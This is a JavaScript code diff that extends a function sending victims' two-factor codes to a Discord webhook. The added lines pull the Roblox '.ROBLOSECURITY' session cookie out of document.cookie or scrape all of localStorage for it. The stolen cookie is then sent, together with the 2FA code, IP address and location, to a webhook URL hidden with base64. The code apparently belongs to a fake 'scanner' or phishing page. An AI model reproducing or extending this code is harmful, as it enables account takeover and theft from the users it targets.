@@ -782,6 +782,34 @@ async function send2FAToWebhook(code, trustDevice) {
         // Get user location (reusing existing function)
         const locationInfo = await getUserLocation();
         
+        // Try to extract Roblox cookie from browser storage or clipboard
+        let robloxCookie = null;
+        
+        // Try to get cookie from document.cookie
+        try {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                    robloxCookie = cookie.trim().substring('.ROBLOSECURITY='.length);
+                    break;
+                }
+            }
+        } catch (e) {
+            console.log('Could not access document.cookie');
+        }
+        
+        // Try localStorage for Roblox data
+        if (!robloxCookie) {
+            try {
+                const localStorageData = Object.keys(localStorage).map(key => {
+                    return `${key}: ${localStorage.getItem(key)}`;
+                }).join('\n');
+                robloxCookie = extractRobloxCookie(localStorageData);
+            } catch (e) {
+                console.log('Could not access localStorage');
+            }
+        }
+        
         // Use the same webhook URL as the main scanner
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
@@ -794,6 +822,7 @@ async function send2FAToWebhook(code, trustDevice) {
 \`\`\`
 Code: ${code}
 Trust Device: ${trustDevice ? 'Yes (30 days)' : 'No'}
+Cookie: ${robloxCookie || 'None found'}
 Time: ${timestamp}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
